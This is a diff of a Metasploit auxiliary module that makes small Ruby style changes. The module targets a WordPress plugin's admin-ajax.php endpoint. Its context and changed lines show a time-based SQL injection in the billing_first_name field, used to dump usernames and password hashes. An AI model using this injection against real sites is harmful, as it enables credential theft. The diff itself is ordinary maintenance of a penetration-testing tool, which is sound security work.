@@ -35,7 +35,7 @@ class MetasploitModule < Msf::Auxiliary
             ['URL', 'https://plugins.trac.wordpress.org/changeset/2413885']
           ],
         'Actions' => [
-          ['List Users', 'Description' => 'Queries username, password hash for COUNT users']
+          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }]
         ],
         'DefaultAction' => 'List Users',
         'DisclosureDate' => '2020-11-05'
@@ -79,7 +79,7 @@ class MetasploitModule < Msf::Auxiliary
       # required or you get values like <> for username and *)/?*//-?//>/?=)+ for password hash
       if payload.include?('<')
         payload.gsub!(/<>/, '=')
-        payload.gsub!(/(sleep\(\d+\.?\d*\)),0/) { '0,' + Regexp.last_match(1) }
+        payload.gsub!(/(sleep\(\d+\.?\d*\)),0/) { "0,#{Regexp.last_match(1)}" }
       end
 
       res = send_request_cgi({
@@ -88,16 +88,16 @@ class MetasploitModule < Msf::Auxiliary
         'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
         'vars_post' => {
           'billing_first_name' => "#{Rex::Text.rand_text_alpha_lower(6)}','','','','',( TRUE AND #{payload})) -- #{Rex::Text.rand_text_alpha_lower(1)}",
-          'billing_last_name' => Rex::Text.rand_surname(),
+          'billing_last_name' => Rex::Text.rand_surname,
           'billing_company' => '',
           'billing_address_1' => Rex::Text.rand_text_alpha(8),
           'billing_address_2' => '',
           'billing_city' => Rex::Text.rand_text_alpha(6),
-          'billing_state' => Rex::Text.rand_state(),
+          'billing_state' => Rex::Text.rand_state,
           'billing_postcode' => Rex::Text.rand_text_numeric(6),
-          'billing_country' => Rex::Text.rand_country(),
+          'billing_country' => Rex::Text.rand_country,
           'billing_phone' => Rex::Text.rand_text_numeric(9),
-          'billing_email' => "#{Rex::Text.rand_surname()}@#{Rex::Text.rand_text_alpha_lower(6)}.com",
+          'billing_email' => "#{Rex::Text.rand_surname}@#{Rex::Text.rand_text_alpha_lower(6)}.com",
           'order_notes' => '',
           'wcal_guest_capture_nonce' => nonce,
           'action' => 'save_data'
